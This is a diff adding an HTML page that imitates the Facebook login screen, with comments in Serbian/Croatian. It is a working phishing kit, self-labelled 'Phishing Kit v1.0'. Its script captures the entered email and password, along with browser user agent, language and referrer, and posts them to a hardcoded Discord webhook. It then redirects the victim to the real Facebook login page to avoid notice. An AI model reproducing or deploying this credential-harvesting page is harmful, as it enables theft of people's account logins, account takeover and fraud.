@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – log in or sign up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        /* Reset i osnovni stilovi */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: Helvetica, Arial, sans-serif; 
+            background-color: #F0F2F5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 10px;
+        }
+        
+        /* Kontejner koji liči na FB layout */
+        .container { 
+            display: flex; 
+            width: 100%;
+            max-width: 980px; 
+            height: 550px; 
+            background: white; 
+            border-radius: 10px; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            overflow: hidden; 
+        }
+        
+        .left { 
+            flex: 1; 
+            padding: 40px; 
+            color: #1C1E21; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center;
+        }
+        .right { 
+            flex: 1; 
+            padding: 40px; 
+            border-left: 1px solid #E4E6EB; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center;
+            width: 396px;
+        }
+        
+        h1 { color: #1877F2; font-size: 56px; margin: 0 0 20px 0; font-weight: 600; }
+        p.tagline { font-size: 28px; font-weight: 600; color: #1C1E21; line-height: 1.2; }
+        
+        /* Form stilovi */
+        .form-group { margin-bottom: 15px; }
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            border: 1px solid #DDDFE2; 
+            border-radius: 6px; 
+            font-size: 17px; 
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus { border-color: #1877F2; box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1); }
+        
+        button { 
+            width: 100%; 
+            background: #1877F2; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            padding: 12px; 
+            font-size: 20px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        button:hover { background-color: #166FE5; }
+        button:disabled { background-color: #8095B5; cursor: not-allowed; }
+        
+        .footer { margin-top: 15px; font-size: 13px; color: #606770; text-align: center; }
+        a { color: #1877F2; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        
+        /* Mobilna responsivnost */
+        @media (max-width: 768px) {
+            .left { display: none; } /* Sakrij levu stranu na mobilnom */
+            .container { height: auto; padding: 20px; max-width: 450px; }
+            .right { padding: 0; border: none; width: 100%; }
+            h1 { display: none; } /* Sakrij veliki naslov na mobilnom */
+            .mobile-logo {
+                display: block;
+                text-align: center;
+                margin-bottom: 20px;
+            }
+            .mobile-logo span {
+                color: #1877F2;
+                font-size: 32px;
+                font-weight: 700;
+            }
+        }
+        
+        /* Desktop: Sakrij mobilni logo */
+        .mobile-logo { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        
+        <div class="right">
+            <!-- Mobilni logo (vidljiv samo na mobilnom) -->
+            <div class="mobile-logo">
+                <span>facebook</span>
+            </div>
+
+            <form id="phishForm">
+                <div class="form-group">
+                    <input type="text" id="email" name="email" placeholder="Email or phone" required autocomplete="off" autofocus>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
+                </div>
+                
+                <button type="submit" id="submitBtn">Log In</button>
+                
+                <div class="footer">
+                    <a href="#" onclick="return false;">Forgotten password?</a><br><br>
+                    <a href="#" onclick="return false;">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Tvoj Discord Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1559587234720522270/sd7OP6rk_gDhVByOQB6Wzpcn46870az08AGDF2y3wUCweHBk6l4OqoMZNRXHLMMJa1c6";
+
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Spriječite default submit
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer;
+            const timestamp = new Date().toISOString();
+            const browserLanguage = navigator.language;
+
+            // Formatiraj poruku za Discord embed
+            const embed = {
+                "title": "🔓 New Facebook Credential Captured",
+                "color": 3066993, // Facebook plava boja
+                "fields": [
+                    {
+                        "name": "📧 Email",
+                        "value": email || "*(empty)*",
+                        "inline": true
+                    },
+                    {
+                        "name": "🔑 Password",
+                        "value": password || "*(empty)*",
+                        "inline": true
+                    },
+                    {
+                        "name": "🕒 Time (UTC)",
+                        "value": timestamp,
+                        "inline": true
+                    },
+                    {
+                        "name": "🖥️ User Agent",
+                        "value": userAgent,
+                        "inline": false
+                    },
+                    {
+                        "name": "🌐 Language",
+                        "value": browserLanguage,
+                        "inline": true
+                    },
+                    {
+                        "name": "🔗 Referrer",
+                        "value": referrer || "*(none)*",
+                        "inline": false
+                    }
+                ],
+                "footer": {
+                    "text": "Source: Phishing Kit v1.0"
+                },
+                "timestamp": timestamp
+            };
+
+            const payload = {
+                "embeds": [embed]
+            };
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = "Logging in...";
+
+            // Pošalji podatke na Discord
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Discord webhook failed");
+                }
+                // Čekaj kratko da se korisnik ne bi zapitao zašto se ništa ne dešava
+                setTimeout(() => {
+                    // Preusmeri na pravi Facebook
+                    window.location.href = "https://www.facebook.com/login";
+                }, 1500);
+            })
+            .catch(error => {
+                console.error("Error sending to Discord:", error);
+                // Iako je greška, preusmeri da ne bi se primetilo
+                window.location.href = "https://www.facebook.com/login";
+            });
+        });
+    </script>
+</body>
+</html>
